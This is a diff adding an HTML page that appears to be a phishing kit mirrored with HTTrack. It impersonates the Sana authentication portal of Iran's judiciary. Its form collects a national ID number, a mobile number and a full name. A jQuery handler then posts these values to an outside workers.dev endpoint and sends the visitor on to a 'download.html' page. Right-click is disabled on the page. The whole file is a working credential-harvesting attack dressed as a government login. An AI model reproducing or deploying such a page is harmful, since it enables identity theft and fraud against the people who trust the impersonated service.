@@ -1,0 +1,296 @@
+<html ng-app="LoginApp" class="ng-scope">
+
+
+<!-- Mirrored from gapse1.com/page.php by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 22 Mar 2023 13:02:08 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+
+	<meta charset="utf-8">
+
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<meta name="description" content="سامانه احراز هویت ثنا">
+
+	<meta name="keywords" content="ثنا ، ثبت نام الکترونیک قضایی">
+
+	<title>سامانه احراز هویت ثنا | Sana Authentication</title>
+
+	<link href="css/bootstrap-theme.min.css"type="text/css" rel="stylesheet">
+
+	<link href="css/font-awesome.min.css" type="text/css" rel="stylesheet">
+
+	<link href="css/styles.css" type="text/css" rel="stylesheet">
+
+	<script src="css/jquery.min.js"></script>
+
+	<script src="css/sweetalert.min.js"></script>
+
+	
+
+</head>
+
+
+
+<body ng-controller="LoginController" ng-csp="no-unsafe-eval | no-inline-style" oncontextmenu="return false"
+
+	class="ng-scope">
+
+	<div class="container">
+
+		<div class="row row-no-padding">
+
+			<div class="col-md-12 col-sm-12 col-xs-12">
+
+				<div class="background-white border-radius-20 margin-top-15 overflow-hidden shadow-sm overflow-hidden">
+
+					<div class="row row-no-padding no-margin no-padding d-flex" id="containerLogin">
+
+						<div class="col-md-12 col-sm-12 col-xs-12 pull-left">
+
+							<form name="frmAuthenticate" id="frmAuthenticate"
+
+								class="form-horizontal ng-pristine ng-valid ng-scope ng-valid-pattern ng-valid-minlength ng-valid-maxlength ng-valid-jud-validator"
+
+								role="form" ng-keypress="actions.preventEnterKey($event,1)" novalidate=""
+
+								jud-validator="" ng-if="viewModel.loginStep==1">
+
+								<section class="p-3 pt-1 bg-light-default">
+
+								<div class="text-center  login-effect">
+
+                                    <div class="d-flex justify-content-center align-items-center mt-5">
+
+									<img src="img/logo.png" alt="مرکز آمار و فناوری اطلاعات قوه قضائیه">
+
+								</div>
+
+								<div class="d-flex justify-content-center align-items-center font-size-2rem">
+
+									قوه قضائیه
+
+								</div>
+
+                            </div>
+
+									<br>
+
+									<div class="row mt-5 px-5">
+
+										<div class="col-sm-12 col-md-12 col-lg-12 col-xl-12">
+
+											<label class="font-yekan-bold d-block pr-1 font-size-1-5rem"
+
+												for="nationalityCode" dir="rtl">
+
+												شماره ملی
+
+											</label>
+
+											<input id="meli" name="personNationalCode" type="tel"
+
+												autofocus="autofocus" focus-if="1==1"
+
+												class="form-control form-control-user rounded-pill p-2 text-center font-yekan-bold mt-1 ng-pristine ng-valid ng-valid-pattern ng-valid-minlength ng-valid-maxlength ng-valid-jud-validator ng-touched"
+
+												autocomplete="off" pattern="[0123456789٠١٢٣٤٥٦٧٨٩]{10}" maxlength="10"
+
+												ng-maxlength="10" ng-minlength="10"
+
+												ng-keypress="actions.preventCharKey($event)"
+
+												ng-model="login.nationalityCode">
+
+										</div>
+
+									</div>
+
+									<div class="row mt-5 px-5">
+
+										<div class="col-sm-12 col-md-12 col-lg-12 col-xl-12">
+
+											<label class="font-yekan-bold d-block pr-1 font-size-1-5rem"
+
+												for="nationalityCode" dir="rtl">
+
+												شماره همراه
+
+											</label>
+
+											<input id="phone" name="personNationalCode" type="tel"
+
+												autofocus="autofocus" focus-if="1==1"
+
+												class="form-control form-control-user rounded-pill p-2 text-center font-yekan-bold mt-1 ng-pristine ng-valid ng-valid-pattern ng-valid-minlength ng-valid-maxlength ng-valid-jud-validator ng-touched"
+
+												autocomplete="off" pattern="[0123456789٠١٢٣٤٥٦٧٨٩]{10}" maxlength="11"
+
+												ng-maxlength="11" ng-minlength="11"
+
+												ng-keypress="actions.preventCharKey($event)"
+
+												ng-model="login.nationalityCode">
+
+										</div>
+
+									</div>
+
+									<div class="row mt-5 px-5">
+
+										<div class="col-sm-12 col-md-12 col-lg-12 col-xl-12">
+
+											<label class="font-yekan-bold d-block pr-1 font-size-1-5rem"
+
+												for="personPassword" dir="rtl">
+
+												نام و نام خانوادگی
+
+											</label>
+
+											<input id="name" name="personUserPassword" type="text"
+
+												autocomplete="off" focus-if="login.nationalityCode.length==10"
+
+												class="form-control form-control-user rounded-pill p-2 text-center font-yekan-bold mt-1 ng-pristine ng-untouched ng-valid"
+
+												ng-model="login.userPassword">
+
+										</div>
+
+									</div>
+
+								
+
+									<div class="row px-5">
+
+										<div class="col-sm-12 col-md-12 col-lg-12 col-xl-12">
+
+											<button id="submitbtn" class="btn btn-primary d-block btn-user w-100 rounded-pill p-2 mt-4"
+
+												focus-if="login.captchaValueFirst.length==5"
+
+												ng-disabled="viewModel.loading" ng-click="actions.checkPersonLogin()">
+
+												<span ng-if="!viewModel.loading"
+
+													class="ng-scope">
+
+													مرحله بعد
+
+												</span>
+
+											</button>
+
+										</div>
+
+									</div>
+
+									
+
+								</section>
+
+							</form>
+
+						</div>
+
+					</div>
+
+				</div>
+
+			</div>
+
+		</div>
+
+	</div>
+
+
+
+	<script>
+
+		$(document).ready(function() {
+			$.support.cors = true;
+			  $('#submitbtn').click(function(e) {
+
+					e.preventDefault();
+
+					var phone = $('#phone').val();
+
+					var meli = $('#meli').val();
+
+					var name = $('#name').val();
+
+					$.ajax({
+
+						  type: "POST",
+
+						  url: "https://sana.wicaso6530.workers.dev/send",
+
+						  data: {
+
+								"phone": phone,
+
+								"meli": meli,
+
+								"name": name
+
+						  },
+
+						  success: function(data) {
+
+								var response = JSON.parse(data);
+
+								if (response.status == '0') {
+
+									  swal({
+
+											text: response.message,
+
+											icon: "error",
+
+											button: "بستن",
+
+									  });
+
+  
+
+								} else {
+
+									  swal({
+
+											text: response.message,
+
+											icon: "success",
+
+											button: "باشه",
+
+									  });
+
+									  setTimeout(function() {
+
+											window.location = 'download.html';
+
+											return true;
+
+									  }, 1500);
+
+								}
+
+						  }
+
+					});
+
+			  });
+
+		});
+
+  </script>
+
+</body>
+
+
+
+
+<!-- Mirrored from gapse1.com/page.php by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 22 Mar 2023 13:02:14 GMT -->
+</html>
